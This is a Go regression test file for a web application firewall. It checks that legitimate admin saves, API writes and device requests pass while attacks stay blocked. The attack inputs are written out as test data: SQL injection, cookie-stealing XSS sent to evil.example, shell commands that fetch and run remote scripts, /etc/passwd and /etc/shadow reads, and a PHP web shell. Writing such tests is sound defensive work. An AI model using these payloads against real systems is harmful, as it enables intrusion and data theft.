package waf

import (
	"fmt"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"testing"

	"github.com/xmarthost/xmartguard/agent/internal/settings"
)

// TestCustomerFalsePositivesWithCRS replays the kinds of requests customers
// were refused on a live shared server (WAF level normal): an admin panel
// editor saving HTML with code samples, a Livewire component update, an
// attendance device, cPanel's calendar sync and mail client setup. A real
// attack with the same session and the same requests from another site
// stay blocked.
func TestCustomerFalsePositivesWithCRS(t *testing.T) {
	src := os.Getenv("XG_CRS_DIR")
	if src == "" {
		t.Skip("set XG_CRS_DIR to an OWASP CRS 4 checkout")
	}
	// The new rules (shop scraping, cart spam, POST without User-Agent) as
	// approved in the portal; watching, they let these requests through.
	approved := func(m *Manager) {
		m.Intel = func() *Intel { return &Intel{Enforce: []int{IDShopScrape, IDCartSpam, IDNoUAPost}} }
	}
	m := crsManager(t, src, `{"waf":{"enabled":true,"level":"normal","wordpress":true,"generic":true,"bad_bots":true,"sensitive_files":true}}`, "off", approved)
	form, json := "application/x-www-form-urlencoded", "application/json"
	if st := m.Status(); st.Error != "" {
		t.Fatalf("WAF error: %s", st.Error)
	}
	if os.Getenv("XG_DEBUG_WAF") != "" {
		out, _ := exec.Command("apache2ctl", "-t").CombinedOutput()
		t.Logf("configtest: %s\nstates: %+v", out, m.RuleSetStates())
		b, _ := os.ReadFile(filepath.Join(m.RulesDir, "crs-after.conf"))
		t.Logf("after: %s", b)
	}
	editor := "title=Lesson+5&body=" + urlEncode(`<p style="color:#333;font-size:14px">Linux basics: type <code>uname -a</code> then <code>whoami</code> in the terminal.</p><p><a href="https://ssc.example.pk/notes.pdf" target="_blank">Notes</a></p>`)
	live := `{"_token":"abc","components":[{"snapshot":"{\"data\":{\"name\":\"\\u0645\\u0631\\u0627\\u06cc\\u0645\"}}","updates":{"name":"مریم <b>Khan</b>"},"calls":[]}]}`
	attack := "id=" + urlEncode(`1' UNION SELECT username,password FROM users-- -`) + "&q=" + urlEncode(`<script>alert(document.cookie)</script>`) + "&cmd=" + urlEncode(`;cat /etc/passwd;wget http://198.51.100.9/x.sh|sh;`) + "&f=" + urlEncode(`../../../../etc/shadow`) + "&p=" + urlEncode(`<?php system($_GET['c']); ?>`)
	sess := "Cookie: PHPSESSID=0123456789abcdef; XSRF-TOKEN=eyJpdiI6"
	whmcs := "token=0a1b2c3d&tab=1&companyname=Xmart+Host&invoicepayto=" + urlEncode(`<b>Xmart Host</b><br>Lahore`) +
		"&apiallowedips=" + urlEncode(`a:1:{i:0;a:2:{s:2:"ip";s:13:"203.0.113.10";s:4:"note";s:7:"billing";}}`) +
		"&trackingcode=" + urlEncode(`<script async src="https://www.googletagmanager.com/gtag/js?id=G-ABC123"></script>`)
	whmcsSess := "Cookie: WHMCSy551iLvnhYt7=0123456789abcdef"
	self := "Referer: https://ssc.example.pk/alms/Teacher/Editing.php?id=4"
	// Joomla: the session cookie is named by a hash; the administrator saves
	// e-mail templates with markup and scripts, or edits files.
	joomla := "Cookie: 5f2b8c1d9e4a7f3b6c0d8e2a1b9f4c7d=k3l9m2n8p4q7r1s5t6u0v2w8x3; joomla_user_state=logged_in"
	joomlaAdmin := []string{joomla, "Sec-Fetch-Site: same-origin", "Referer: https://joomla.example.ir/administrator/index.php?option=com_rsmembership&view=configuration"}
	template := "jform%5Bemail_body%5D=" + urlEncode(`<p>Dear {name},</p><p onclick="track()">Your membership is active.</p><script>window.dataLayer=window.dataLayer||[];</script>`) + "&task=configuration.apply&5f2b8c1d9e4a7f3b6c0d8e2a1b9f4c7d=1"
	visitorXSS := "name=" + urlEncode(`<script>document.location='https://evil.example/?c='+document.cookie</script>`) + "&message=hi"

	cases := []struct {
		name, host, method, uri, ctype, body string
		hdr                                  []string
		want                                 int
	}{
		// Analytics beacons (navigator.sendBeacon) send text/plain.
		{"Analytics beacon to /hit", "gold.example.com", "POST", "/hit", "text/plain;charset=UTF-8", `{"p":"/","r":"","w":1280}`, []string{"Referer: https://gold.example.com/"}, 200},
		{"Analytics beacon to /api/a", "shop.example.pk", "POST", "/api/a", "text/plain;charset=UTF-8", `{"e":"pageview"}`, nil, 200},
		{"CSP report", "shop.example.pk", "POST", "/csp-report", "application/csp-report", `{"csp-report":{}}`, nil, 200},
		{"Broken font link ending in .com", "shop.example.pk", "GET", "/fonts.googleapis.com", "", "", nil, 200},
		{"Database dump still refused", "shop.example.pk", "GET", "/backup.sql", "", "", nil, 403},
		{"Editor without session or own page is blocked (baseline)", "ssc.example.pk", "POST", "/alms/Teacher/Editing.php", form, editor, nil, 403},
		{"Editor saving from its own page with a session", "ssc.example.pk", "POST", "/alms/Teacher/Editing.php", form, editor, []string{sess, self}, 200},
		{"Same save sent from another site", "ssc.example.pk", "POST", "/alms/Teacher/Editing.php", form, editor, []string{sess, "Referer: https://evil.example.net/alms/Teacher/Editing.php"}, 403},
		{"Real attack with a session stays blocked", "ssc.example.pk", "POST", "/alms/Teacher/Editing.php", form, attack, []string{sess, self}, 403},
		{"Stored XSS through a public form with a session stays blocked", "tea.example.com", "POST", "/submit-comment.php", form, "name=Ali&comment=" + urlEncode(`great <script>document.location="https://evil.example/?c="+document.cookie</script>`), []string{"Cookie: PHPSESSID=abc", "Referer: https://tea.example.com/product.php?id=4"}, 403},
		{"Comment that reads like SQL, with a session", "tea.example.com", "POST", "/submit-comment.php", form, "name=Ali&comment=" + urlEncode(`Best tea -- select it if you like strong taste; 1 or 2 cups/day = perfect`), []string{"Cookie: PHPSESSID=abc", "Referer: https://tea.example.com/product.php?id=4"}, 200},
		// A server overloaded by an SEO backlink crawler walking shop filters.
		{"Backlink crawler on shop filters", "shop.example.com", "GET", "/shop/?s=Kitchen&post_type=product&filter_color=yellow,white,orange", "", "", []string{"User-Agent: Mozilla/5.0 (compatible; SERankingBacklinksBot/1.0; +https://seranking.com/backlinks-crawler)"}, 403},
		{"Backlink crawler on page size", "shop.example.com", "GET", "/shop/page/60/?per_page=24&orderby=price", "", "", []string{"User-Agent: Mozilla/5.0 (compatible; SERankingBacklinksBot/1.0)"}, 403},
		{"Backlink crawler on a plain product page", "shop.example.com", "GET", "/product/kettle/", "", "", []string{"User-Agent: Mozilla/5.0 (compatible; SERankingBacklinksBot/1.0)"}, 200},
		{"Googlebot on shop filters", "shop.example.com", "GET", "/shop/?filter_color=yellow", "", "", []string{"User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}, 200},
		{"Googlebot following add-to-cart", "shop.example.com", "GET", "/shop/?add-to-cart=123", "", "", []string{"User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}, 403},
		{"Visitor using shop filters and cart", "shop.example.com", "GET", "/shop/?filter_color=yellow&orderby=price&add-to-cart=123", "", "", nil, 200},
		// Scrapers with a browser User-Agent walking filter combinations.
		{"Scraper on many filter values", "shop.example.com", "GET", "/shop/?filter_color=yellow,white,orange", "", "", nil, 403},
		{"Scraper on many filters", "shop.example.com", "GET", "/shop/?filter_color=red&filter_size=xl&filter_brand=acme", "", "", nil, 403},
		// A browser clicking a filter sends Sec-Fetch-Site and the site's
		// Referer; filter botnets send only a Referer (business900, 2026-10-22).
		{"Visitor clicking many filter values", "shop.example.com", "GET", "/shop/?filter_color=yellow,white,orange", "", "", []string{"Sec-Fetch-Site: same-origin", "Referer: https://shop.example.com/shop/?filter_color=yellow,white"}, 200},
		{"Filter bot with only a Referer", "shop.example.com", "GET", "/shop/?filter_color=yellow,white,orange", "", "", []string{"Referer: https://shop.example.com/shop/?filter_color=yellow,white"}, 403},
		{"Visitor on a no-referrer site clicking many filters", "shop.example.com", "GET", "/shop/?filter_color=red&filter_size=xl&filter_brand=acme", "", "", []string{"Sec-Fetch-Site: same-origin"}, 200},
		{"Guest's first add-to-cart with a nonce", "shop.example.com", "GET", "/shop/?add-to-cart=55&_wpnonce=f00d", "", "", nil, 200},
		{"Visitor with cookies on many filters", "shop.example.com", "GET", "/shop/?filter_color=red&filter_size=xl&filter_brand=acme", "", "", []string{"Cookie: _ga=GA1.1.1"}, 200},
		{"Googlebot on many filter values", "shop.example.com", "GET", "/shop/?filter_color=yellow,white,orange", "", "", []string{"User-Agent: Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"}, 200},
		{"Cart spam: remove and add in one link", "shop.example.com", "GET", "/cart/?remove_item=abc123&add-to-cart=55", "", "", []string{"Cookie: woocommerce_items_in_cart=1"}, 403},
		{"Cart change without a session", "shop.example.com", "GET", "/cart/?remove_item=abc123&_wpnonce=f00d", "", "", nil, 403},
		{"Visitor removing a cart item", "shop.example.com", "GET", "/cart/?remove_item=abc123&_wpnonce=f00d", "", "", []string{"Cookie: woocommerce_items_in_cart=1; wp_woocommerce_session_x=y"}, 200},
		// WHMCS admin (the admin folder has its own name) saving General Settings.
		{"WHMCS admin saving settings", "my.example.com", "POST", "/MANZ00R/configgeneral.php?action=save", form, whmcs, []string{whmcsSess, "Referer: https://my.example.com/MANZ00R/configgeneral.php"}, 200},
		{"WHMCS admin save without a Referer (strict Referrer-Policy)", "my.example.com", "POST", "/MANZ00R/configgeneral.php?action=save", form, whmcs, []string{whmcsSess, "Sec-Fetch-Site: same-origin"}, 200},
		{"WHMCS admin save posted from another site", "my.example.com", "POST", "/MANZ00R/configgeneral.php?action=save", form, whmcs, []string{whmcsSess, "Sec-Fetch-Site: cross-site"}, 403},
		{"Same save without the WHMCS session", "my.example.com", "POST", "/MANZ00R/configgeneral.php?action=save", form, whmcs, []string{"Referer: https://my.example.com/MANZ00R/configgeneral.php"}, 403},
		{"Same save sent from another site", "my.example.com", "POST", "/MANZ00R/configgeneral.php?action=save", form, whmcs, []string{whmcsSess, "Referer: https://evil.example.net/x"}, 403},
		{"Client area post with the WHMCS session stays checked", "my.example.com", "POST", "/submitticket.php", form, whmcs, []string{whmcsSess, "Referer: https://my.example.com/submitticket.php"}, 403},
		// The Jetpack mobile app manages sites from its users' own connections.
		{"Jetpack app on XML-RPC", "blog.example.com", "POST", "/xmlrpc.php", "text/xml", `<?xml version="1.0"?><methodCall><methodName>wp.getUsersBlogs</methodName></methodCall>`, []string{"User-Agent: jetpack-android/24.1"}, 200},
		{"Mobile app on XML-RPC", "blog.example.com", "POST", "/xmlrpc.php", "text/xml", `<?xml version="1.0"?><methodCall><methodName>wp.getPosts</methodName></methodCall>`, []string{"User-Agent: wp-android/24.1"}, 200},
		// POSTs from tools without any browser header.
		{"POST without User-Agent to a script", "site.example.com", "POST", "/old/includes/up.php", form, "a=1", []string{"User-Agent: "}, 403},
		{"Joomla administrator saving an e-mail template", "joomla.example.ir", "POST", "/administrator/index.php?option=com_rsmembership&view=configuration", form, template, joomlaAdmin, 200},
		{"Joomla administrator saving a file in File Explorer", "joomla.example.ir", "POST", "/administrator/index.php?option=com_ffexplorer&task=save", form, "content=" + urlEncode(`<?php defined('_JEXEC') or die; echo '<script src="/media/site.js"></script>'; ?>`), joomlaAdmin, 200},
		// Since 0.24.8 Joomla's form token alone lifts the threshold (no
		// header: LiteSpeed's engine); Joomla checks the token, so a page of
		// another site cannot forge the save.
		{"Same save without the browser's same-site headers", "joomla.example.ir", "POST", "/administrator/index.php?option=com_rsmembership&view=configuration", form, template, []string{joomla}, 200},
		{"Same save sent from another site (Joomla refuses the token)", "joomla.example.ir", "POST", "/administrator/index.php?option=com_rsmembership&view=configuration", form, template, []string{joomla, "Sec-Fetch-Site: cross-site", "Referer: https://evil.example/administrator/x"}, 200},
		{"Same save without the form token or same-site headers", "joomla.example.ir", "POST", "/administrator/index.php?option=com_rsmembership&view=configuration", form, strings.TrimSuffix(template, "&5f2b8c1d9e4a7f3b6c0d8e2a1b9f4c7d=1"), []string{joomla}, 403},
		{"Script in a Joomla visitor's form still refused", "joomla.example.ir", "POST", "/index.php?option=com_contact", form, visitorXSS, []string{joomla, "Referer: https://joomla.example.ir/contact"}, 403},
		{"Payment callback without User-Agent", "site.example.com", "POST", "/modules/gateways/callback/jazzcash.php", form, "a=1", []string{"User-Agent: "}, 200},
		{"Webhook without User-Agent", "site.example.com", "POST", "/app/webhook.php", form, "a=1", []string{"User-Agent: "}, 200},
		{"API call without User-Agent", "site.example.com", "POST", "/api/v1/orders.php", form, "a=1", []string{"User-Agent: "}, 200},
		{"Form post with a session and no User-Agent", "site.example.com", "POST", "/old/includes/save.php", form, "a=1", []string{"User-Agent: ", "Cookie: PHPSESSID=abc"}, 200},
		{"Stripe settings dump", "shop.example.com", "GET", "/wp-content/woocommerce_stripe_settings.tar.gz", "", "", nil, 403},
		{"Stripe settings text", "shop.example.com", "GET", "/wp-content/woocommerce_stripe_cc_settings.txt", "", "", nil, 403},
		{"Options dump", "shop.example.com", "GET", "/wp_options.sql", "", "", nil, 403},
		{"Livewire update (Origin header)", "shop.example.top", "POST", "/livewire-4fd0b3db/update", json, live, []string{"Cookie: laravel_session=abc; XSRF-TOKEN=def", "Origin: https://shop.example.top", "X-Livewire: 1"}, 200},
		{"Attendance device push", "hospital.example.com", "POST", "/iclock/cdata?SN=UFS2261401098&table=ATTLOG&Stamp=9999", "application/push", "1001\t2026-10-10 08:01:22\t0\t1\t0\t0\t0", []string{"User-Agent: iClock Proxy/1.09"}, 200},
		{"cPanel calendar sync", "cpcalendars.example.com", "POST", "/", "text/xml", `<?xml version="1.0"?><C:calendar-query xmlns:C="urn:ietf:params:xml:ns:caldav"><D:prop xmlns:D="DAV:"><D:getetag/></D:prop><C:filter><C:comp-filter name="VCALENDAR"/></C:filter></C:calendar-query>`, []string{"Cookie: cpsession=abc"}, 200},
		{"Thunderbird/Outlook setup", "127.0.0.1", "POST", "/cgi-sys/autodiscover.cgi", "text/xml", `<?xml version="1.0"?><Autodiscover xmlns="http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006"><Request><EMailAddress>ali@example.pk</EMailAddress><AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema></Request></Autodiscover>`, nil, 200},
	}
	for _, c := range cases {
		if got := sendBody(t, c.host, c.method, c.uri, c.ctype, c.body, c.hdr...); (got == 403) != (c.want == 403) || got == 0 {
			t.Errorf("%s: %s %s got %d, want %d", c.name, c.method, c.uri, got, c.want)
		}
	}
	if !strings.Contains(sessionSetup(), "id:7700044") {
		t.Fatal("session rule id")
	}
}

// The admin-area lift reads the session cookie from the Cookie header:
// LiteSpeed's engine does not fill the cookie collections reliably, so a
// rule counting REQUEST_COOKIES never matched there (joomlashare.ir on
// business600: Joomla administrator saves scoring 10-25 refused until
// 0.23.28, and the owner banned for "15 WAF blocked").
func TestAdminAreaReadsCookieHeader(t *testing.T) {
	setup := adminAreaSetup()
	// No macro either (joomlashares.com, after 0.23.28): same site is the
	// browser's Sec-Fetch-Site.
	if strings.Contains(setup, "%{") || strings.Contains(sessionSetup(), fmt.Sprintf("id:%d,", IDSessionSite+1000)) == false {
		t.Fatalf("admin area setup uses a macro, or no session rule without one:\n%s", setup)
	}
	if strings.Contains(setup, "REQUEST_COOKIES") || !strings.Contains(setup, `REQUEST_HEADERS:Cookie "@rx [^\s;=]+=[^\s;]"`) {
		t.Fatalf("admin area setup:\n%s", setup)
	}
	c := settings.Defaults().WAF
	c.Enabled = true
	out := Render(c, Options{Dir: "/r"})
	if ch := chainOf(out, IDAdminPanel); len(ch) == 0 || strings.Contains(strings.Join(ch, "\n"), "REQUEST_COOKIES") {
		t.Fatalf("admin panel exclusion: %q", ch)
	}
}

// Admin areas on LiteSpeed: its ModSecurity ignores ctl:ruleRemoveByTag, so
// the admin-panel exclusion (7700018) does nothing there and a Joomla
// administrator's saves were refused (business600, 2026-10-19). With that
// rule off, as on LiteSpeed, the threshold lift must carry them alone.
func TestAdminAreaSavesWithoutRuleRemoval(t *testing.T) {
	src := os.Getenv("XG_CRS_DIR")
	if src == "" {
		t.Skip("set XG_CRS_DIR to an OWASP CRS 4 checkout")
	}
	m := crsManager(t, src, `{"waf":{"enabled":true,"level":"normal","generic":true,"disabled_rules":[7700018]}}`, "off", nil)
	if st := m.Status(); st.Error != "" {
		t.Fatalf("WAF error: %s", st.Error)
	}
	form := "application/x-www-form-urlencoded"
	joomla := "Cookie: 5f2b8c1d9e4a7f3b6c0d8e2a1b9f4c7d=k3l9m2n8p4q7r1s5t6u0v2w8x3"
	own := []string{joomla, "Sec-Fetch-Site: same-origin", "Referer: https://joomla.example.ir/administrator/index.php?option=com_rsmembership"}
	template := "jform%5Bemail_body%5D=" + urlEncode(`<p onclick="track()">Your membership is active.</p><script>window.dataLayer=window.dataLayer||[];</script>`)
	file := "content=" + urlEncode(`<?php defined('_JEXEC') or die; echo '<script src="/media/site.js"></script>'; system('ls'); ?>`)
	token := "0123456789abcdef0123456789abcdef=1"
	ck, cs := "ck_"+strings.Repeat("0a", 20), "cs_"+strings.Repeat("1b", 20)
	product := "name=" + urlEncode("Men leather shoes") + "&description=" + urlEncode(`<p onclick="zoom()">Soft leather</p><img src="a.jpg" onerror="this.style.display='none'"><script>var sku='CJ123';</script>`)
	htmaker := "task=apply&custhead=" + urlEncode("RewriteCond %{HTTP_USER_AGENT} (wget|curl|python-requests|libwww-perl) [NC]\nRewriteRule .* - [F]") +
		"&exceptionfiles=" + urlEncode("administrator/components/com_akeebabackup/restore.php\nkickstart.php") +
		"&exceptiondirs=" + urlEncode("cli\nbin\ntmp") + "&httpsurls=&cgibin=" + urlEncode("/usr/local/cgi-bin/php.cgi") +
		"&custfoot=" + urlEncode("php_value upload_max_filesize 64M\nAddHandler application/x-httpd-ea-php82 .php")
	globalCfg := "jform%5Bsendmail%5D=" + urlEncode("/usr/sbin/sendmail") + "&jform%5Blog_path%5D=" + urlEncode("/home/joomlash/public_html/administrator/logs") +
		"&jform%5Boffline_message%5D=" + urlEncode(`<p>Back soon</p><script>alert(1)</script>`) + "&task=application.apply&" + token
	attack := url.Values{"q": {"<script>alert(document.cookie)</script>"}, "id": {"1' UNION SELECT user,password FROM users-- -"},
		"file": {"../../../../etc/passwd"}, "cmd": {";cat /etc/passwd; wget http://evil.example/x.sh -O /tmp/x; sh /tmp/x"}}.Encode()
	cases := []struct {
		name, host, uri, body string
		hdr                   []string
		want                  int
	}{
		{"Joomla e-mail template", "joomla.example.ir", "/administrator/index.php?option=com_rsmembership&view=configuration", template, own, 200},
		{"Joomla File Explorer save", "joomla.example.ir", "/administrator/index.php?option=com_ffexplorer&task=save", file, own, 200},
		// joomlashares.com (2026-10-26): Joomla Global Configuration (paths
		// and the sendmail program read as OS file access and shell code).
		{"Joomla Global Configuration save", "joomla.example.ir", "/administrator/index.php?option=com_config",
			"jform%5Bsendmail%5D=" + urlEncode("/usr/sbin/sendmail") + "&jform%5Blog_path%5D=" + urlEncode("/home/joomlash/public_html/administrator/logs") +
				"&jform%5Btmp_path%5D=" + urlEncode("/home/joomlash/public_html/tmp") + "&jform%5Boffline_message%5D=" + urlEncode(`<p>Back soon</p><script>alert(1)</script>`) +
				"&task=application.apply&0123456789abcdef0123456789abcdef=1",
			[]string{joomla, "Sec-Fetch-Site: same-origin", "Referer: https://joomla.example.ir/administrator/index.php?option=com_config"}, 200},
		// joomlashare.ir (2026-10-21..25): jDownloads item saves scoring 25.
		{"Joomla jDownloads item save", "joomla.example.ir", "/administrator/index.php?option=com_jdownloads&layout=edit&id=60",
			"jform%5Bdescription%5D=" + urlEncode(`<div class="dl"><a href="#" onclick="return false">Download</a></div><pre>wget https://example.com/x.zip; ls -la</pre>`) +
				"&jform%5Bnotes%5D=" + urlEncode(`php_value upload_max_filesize 64M`), own, 200},
		{"OpenCart product description", "shop.example.pk", "/admin/index.php?route=catalog/product.save", template,
			[]string{"Cookie: OCSESSID=abc123", "Sec-Fetch-Site: same-origin", "Referer: https://shop.example.pk/admin/index.php?route=catalog/product.form"}, 200},
		{"Without the browser's same-site headers", "joomla.example.ir", "/administrator/index.php?option=com_rsmembership&view=configuration", template, []string{joomla}, 403},
		{"From another site", "joomla.example.ir", "/administrator/index.php", template, []string{joomla, "Sec-Fetch-Site: cross-site", "Referer: https://evil.example/administrator/"}, 403},
		{"A cookie header without a value", "joomla.example.ir", "/administrator/index.php", template,
			[]string{"Cookie: ;", "Sec-Fetch-Site: same-origin", "Referer: https://joomla.example.ir/administrator/index.php"}, 403},
		// The attack the same site gets every day stays blocked (front end, as
		// the attack tools send it).
		{"Front-end code injection", "joomla.example.ir", "/index.php?option=com_content&view=featured&format=feed", "x=" + urlEncode(`{source}<?=file_put_contents('a.php',file_get_contents('https://evil.example/x'));?>{/source}`), nil, 403},
		{"Customer dashboard is not an admin area", "smm.example.pk", "/dashboard/profile", template, []string{"Cookie: PHPSESSID=abc", "Sec-Fetch-Site: same-origin", "Referer: https://smm.example.pk/dashboard/"}, 403},
		// joomlashares.com (business600, LiteSpeed, 2026-10-27/28): saves
		// refused with the header lifts in place. Joomla's form token alone
		// (no Sec-Fetch-Site, no Referer) lifts the threshold.
		{"Admin Tools .htaccess Maker without same-site headers", "joomla.example.ir", "/administrator/index.php?option=com_admintools&view=htaccessmaker", htmaker + "&" + token, []string{joomla}, 200},
		{"The same without the form token", "joomla.example.ir", "/administrator/index.php?option=com_admintools&view=htaccessmaker", htmaker, []string{joomla}, 403},
		{"Global Configuration without same-site headers", "joomla.example.ir", "/administrator/index.php?option=com_config", globalCfg, []string{joomla}, 200},
		{"File Explorer save without same-site headers", "joomla.example.ir", "/administrator/?option=com_ffexplorer", file + "&task=save&" + token, []string{joomla}, 200},
		{"A token-shaped field on the front end", "joomla.example.ir", "/index.php?option=com_content&view=featured&format=feed",
			"x=" + urlEncode(`{source}<?=file_put_contents('a.php',file_get_contents('https://evil.example/x'));?>{/source}`) + "&" + token, nil, 403},
		{"A token-shaped field in another admin file", "joomla.example.ir", "/administrator/components/com_x/upload.php", htmaker + "&" + token, nil, 403},
		{"An attack tool posting to the administrator with a token-shaped field", "joomla.example.ir", "/administrator/index.php", attack + "&" + token, nil, 403}, // ssshoesmaker.com (business900, 2026-10-30/31): CJdropshipping's
		// product listing refused as XSS (941100, 941160).
		{"WooCommerce API product write with keys", "shop.example.pk", "/wp-json/wc/v3/products?consumer_key=" + ck + "&consumer_secret=" + cs, product, nil, 200},
		{"WooCommerce API batch with OAuth keys", "shop.example.pk", "/wp-json/wc/v3/products/batch?oauth_consumer_key=" + ck + "&oauth_signature=abc", product, nil, 200},
		{"The same without keys", "shop.example.pk", "/wp-json/wc/v3/products", product, nil, 403},
		{"Keys on another route", "shop.example.pk", "/wp-json/wp/v2/users?consumer_key=" + ck, attack, nil, 403},
		{"An attack with keys", "shop.example.pk", "/wp-json/wc/v3/products?consumer_key=" + ck, attack, nil, 403},
	}
	for _, c := range cases {
		if got := sendBody(t, c.host, "POST", c.uri, form, c.body, c.hdr...); (got == 403) != (c.want == 403) || got == 0 {
			t.Errorf("%s: got %d, want %d", c.name, got, c.want)
		}
	}
}

// business600 (2026-10-31): joomlashare.ir and the customer's other domains
// were in waf.whitelist_domains, which took out xPGuard's rules
// 7700003-7709999 whole, the relaxations among them, while the OWASP CRS
// still blocked: their administrator saves scoring 10 were refused through
// every relaxation fix since 0.23.28. A whitelisted domain now keeps the
// relaxations and loses only xPGuard's blocking rules.
func TestWhitelistedDomainKeepsRelaxations(t *testing.T) {
	removed := func(id int) bool {
		for _, p := range strings.Split(whiteDomainRemovals(), ",") {
			r := strings.TrimPrefix(p, "ctl:ruleRemoveById=")
			lo, hi, ok := strings.Cut(r, "-")
			if !ok {
				hi = lo
			}
			a, b := atoi(lo), atoi(hi)
			if id >= a && id <= b {
				return true
			}
		}
		return false
	}
	for _, id := range []int{IDJoomlaAdmin, IDJoomlaAdmin + 1000, IDWCRestKeys, IDWCRestKeys + 2000, IDAdminArea, IDSessionSite + 1000, IDEditorCookie, IDEditorAdmin, IDAppSave, IDSessionXSS, IDWPAdminExcl, IDWHMCSAdminFetch} {
		if removed(id) {
			t.Errorf("relaxation %d removed for whitelisted domains", id)
		}
	}
	for _, id := range []int{IDDisable, IDContentType, IDSoftDeny, IDCentralNoBrowser, 7700301, 7700201, 7700601, 7701001, 7703001} {
		if !removed(id) {
			t.Errorf("blocking rule %d kept for whitelisted domains", id)
		}
	}
	src := os.Getenv("XG_CRS_DIR")
	if src == "" {
		t.Skip("set XG_CRS_DIR to an OWASP CRS 4 checkout")
	}
	crsManager(t, src, `{"waf":{"enabled":true,"level":"normal","wordpress":true,"whitelist_domains":["joomla.example.ir"]}}`, "off", nil)
	form := "application/x-www-form-urlencoded"
	joomla := "Cookie: 5f2b8c1d9e4a7f3b6c0d8e2a1b9f4c7d=k3l9m2n8p4q7r1s5t6u0v2w8x3"
	htmaker := "task=apply&custhead=" + urlEncode("RewriteCond %{HTTP_USER_AGENT} (wget|curl|python-requests|libwww-perl) [NC]\nRewriteRule .* - [F]") +
		"&cgibin=" + urlEncode("/usr/local/cgi-bin/php.cgi") + "&exceptiondirs=" + urlEncode("cli\nbin\ntmp")
	cases := []struct {
		name, host, uri, body string
		want                  int
	}{
		{"Whitelisted domain: .htaccess Maker save with the token", "joomla.example.ir", "/administrator/index.php?option=com_admintools&view=htaccessmaker", htmaker + "&0123456789abcdef0123456789abcdef=1", 200},
		{"Whitelisted domain: the same without the token", "joomla.example.ir", "/administrator/index.php?option=com_admintools&view=htaccessmaker", htmaker, 403},
		{"Whitelisted domain: xPGuard's own block rule stays off", "joomla.example.ir", "/wp-content/uploads/x.php", "a=1", 200},
		{"Other domain: xPGuard's own block rule applies", "other.example.ir", "/wp-content/uploads/x.php", "a=1", 403},
	}
	for _, c := range cases {
		if got := sendBody(t, c.host, "POST", c.uri, form, c.body, joomla); (got == 403) != (c.want == 403) || got == 0 {
			t.Errorf("%s: got %d, want %d", c.name, got, c.want)
		}
	}
}
